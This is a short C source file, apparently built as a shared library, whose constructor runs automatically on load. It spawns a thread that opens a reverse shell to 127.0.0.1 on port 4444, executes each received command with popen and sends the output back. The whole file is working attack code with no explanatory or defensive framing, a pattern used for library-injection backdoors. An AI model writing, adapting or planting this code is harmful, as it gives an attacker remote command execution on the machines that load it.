#include <pthread.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>

#define IP "127.0.0.1"
#define PORT 4444

void *reverse_shell(void *arg)
{
    char cmd[1024];
    FILE *fp;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    inet_pton(AF_INET, IP, &(server_addr.sin_addr));
    connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr));

    while (1)
    {
        int bytes_read = read(sockfd, cmd, sizeof(cmd) - 1);
        if (bytes_read > 0)
        {
            cmd[bytes_read] = '\0';
            if ((fp = popen(cmd, "r")))
            {
                while (fgets(cmd, sizeof(cmd), fp))
                    write(sockfd, cmd, sizeof(cmd));
                pclose(fp);
                memset(cmd, 0, sizeof(cmd));
            }
        }
    }
}

__attribute__((constructor)) void library_init(void)
{
    pthread_t thread;
    pthread_create(&thread, NULL, reverse_shell, NULL);
}
